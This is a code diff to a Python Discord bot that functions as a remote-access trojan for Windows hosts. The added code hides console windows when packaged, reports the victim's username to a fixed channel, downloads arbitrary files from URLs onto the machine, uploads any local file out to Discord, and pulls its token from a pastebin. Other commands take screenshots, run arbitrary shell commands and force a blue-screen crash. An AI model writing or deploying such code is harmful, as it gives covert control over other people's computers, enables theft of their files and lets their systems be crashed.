@@ -3,22 +3,34 @@ from datetime import datetime
 import validators
 import subprocess
 import pyautogui
+import requests
 import discord
 import ctypes
+import sys
 import os
+import re
 
 
+if getattr(sys, 'frozen', False):  # if built with pyinstaller
+    file_path = os.path.abspath(sys.executable)
+    silent = 0x08000000
+else:
+    file_path = os.path.abspath(__file__)
+    silent = 0
+
+copium_ver = 1.2
+whoami = subprocess.run("whoami", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout.rstrip()
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
+current_login = None
 
 
 def log_command(ctx, args=None, error=False):
     if ctx.message.content:
         command = ctx.message.content
     else:
+        content = ""
         if args:
-            content = " "+args
-        else:
-            content = ""
+            content = " " + args
         command = f"{ctx.prefix}{ctx.command}{content}"
     return f'{ctx.author} {"caused an error using" if error else "executed"} "{command}" in "#{ctx.channel}" at {datetime.now().strftime("%H:%M:%S")}'
 
@@ -26,6 +38,10 @@ def log_command(ctx, args=None, error=False):
 @client.event
 async def on_ready():
     await client.tree.sync()
+
+    channel = await client.fetch_channel(960345653454729226)
+    await channel.send(f"Host started on \"{whoami}\"")
+
     logon_message = f'Logged on as {client.user}, at {datetime.now().strftime("%H:%M:%S")}, in the servers:'
     print('-' * len(logon_message))
     print(logon_message)
@@ -43,13 +59,61 @@ async def on_command_error(ctx, error):
 # Bot commands
 @client.hybrid_command(name="lock", with_app_command=True, description="locks the host's computer")
 async def lock_command(ctx):
-    subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True)
+    if current_login != whoami:
+        return
+
+    subprocess.run("rundll32.exe user32.dll, LockWorkStation", shell=True, creationflags=silent)
     await ctx.reply("Computer locked successfully!", ephemeral=True)
     print(log_command(ctx))
 
 
+@client.hybrid_command(name="download", with_app_command=True, description="downloads from the url to the execution path")
+async def download_command(ctx, url, filename=None):
+    if current_login != whoami:
+        return
+
+    if not filename:
+        filename = re.findall("[^(/\\\\:*?\"<>|)]+\\.[^(/\\\\:*?\"<>|)]+", url)[-1]
+        if not filename:
+            await ctx.reply("You must specify a name or send a url with a name on it", ephemeral=True)
+            return
+    await ctx.reply(f"Trying to download {filename}", ephemeral=True)
+    print(log_command(ctx, url + filename))
+    r = requests.get(url)
+    with open(filename, 'wb') as file:
+        for chunk in r.iter_content(chunk_size=8192):
+            if chunk:
+                file.write(chunk)
+
+
+@client.hybrid_command(name="upload", with_app_command=True, description="uploads from the path to discord")
+async def upload_command(ctx, path):
+    if current_login != whoami:
+        return
+
+    path = os.path.abspath(path)
+    byte_size = os.path.getsize(path)
+    if byte_size < 8000000:
+        await ctx.reply(file=discord.File(path), ephemeral=True)
+    else:
+        await ctx.reply(f"{os.path.basename(path)} is too big for discord: {byte_size} bytes", ephemeral=True)
+    print(log_command(ctx, path))
+
+
+@client.hybrid_command(name="login", with_app_command=True, description="logs into the specified host")
+async def login_command(ctx, host):
+    if host == whoami:
+        global current_login
+        current_login = whoami
+        await ctx.reply(f"Logged into {current_login}", ephemeral=True)
+    print(log_command(ctx, host))
+
+
 @client.hybrid_command(name="ss", with_app_command=True, description="takes a screenshot of the host")
 async def screenshot_command(ctx):
+    if current_login != whoami:
+        return
+
     pyautogui.screenshot("ss.png")
     await ctx.reply(file=discord.File("ss.png"), ephemeral=True)
     os.remove("ss.png")
@@ -58,6 +122,9 @@ async def screenshot_command(ctx):
 
 @client.hybrid_command(name="bsod", with_app_command=True, description="makes the host's computer die instantly")
 async def bsod_command(ctx):
+    if current_login != whoami:
+        return
+
     await ctx.reply("Trying to execute a BSOD", ephemeral=True)
     nullptr = ctypes.POINTER(ctypes.c_int)()
     ctypes.windll.ntdll.RtlAdjustPrivilege(ctypes.c_uint(19), ctypes.c_uint(1), ctypes.c_uint(0), ctypes.byref(ctypes.c_int()))
@@ -67,7 +134,10 @@ async def bsod_command(ctx):
 
 @client.hybrid_command(name="cmd", with_app_command=True, description="executes a shell command in the host")
 async def cmd_command(ctx, *, command):
-    command_result = subprocess.run(command, shell=True, capture_output=True, encoding='cp858').stdout
+    if current_login != whoami:
+        return
+
+    command_result = subprocess.run(command, shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout
     if command_result:
         if len(command_result) <= 1983:
             await ctx.reply(f'Command result: {command_result}', ephemeral=True)
@@ -87,15 +157,17 @@ async def cmd_command(ctx, *, command):
 
 @client.hybrid_command(name="site", with_app_command=True, description="opens the specified site in the host")
 async def site_command(ctx, site):
+    if current_login != whoami:
+        return
+
     if validators.url(site):
         await ctx.reply(f'Successfully started "{site}"', ephemeral=True)
-        subprocess.run(f'start {site}', shell=True)
+        subprocess.run(f'start {site}', shell=True, creationflags=silent)
         print(log_command(ctx, site))
     else:
         raise Exception(f'"{site}" is not a valid url')
 
 
 if __name__ == '__main__':
-    with open("token.txt", "r") as f:
-        TOKEN = f.read()
-    client.run(TOKEN)
+    TOKEN = requests.get("some pastebin raw url").content.decode()
+    client.run(TOKEN, log_handler=None)
